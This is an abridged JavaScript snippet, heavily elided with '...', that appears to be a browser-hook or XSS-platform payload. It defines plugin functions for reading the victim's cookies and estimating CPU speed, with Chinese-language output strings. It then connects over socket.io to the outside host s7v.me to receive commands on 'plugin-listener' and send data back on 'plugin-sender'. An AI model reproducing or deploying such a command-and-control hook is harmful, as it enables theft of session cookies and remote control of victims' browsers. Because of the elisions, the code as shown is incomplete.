(function (ant) {
  (function (t) {
      ...
      (function (API) {
        ...
        var PLUGIN = {
          ...
          getcpuspeed: function () {
            ...
            return (
              "时间:" +
              Math.round(di * 1000) / 1000 +
              "秒, 估计速度:" +
              Math.round(spd * 1000) / 1000 +
              "GHZ"
            );
          },
          getcookie: function () {
    ...
    config: { host: window.location.protocol + "//s7v.me" },
    init: function (fn, timeout) {
      var self = this,
        api = new self.API();
      setTimeout(function () {
        api.loadJS(self.config.host + "/pro/js/socket.io.min.js", function () {
    ...
    API: function () {
      return {
        ...
        listen: function (t) {
          ...
          this.socket.on("plugin-listener", t);
          return this;
        },
        send: function (t) {
          this.socket.emit("plugin-sender", t);
          return this;
        },
        save: function (t, n) {
          var e =
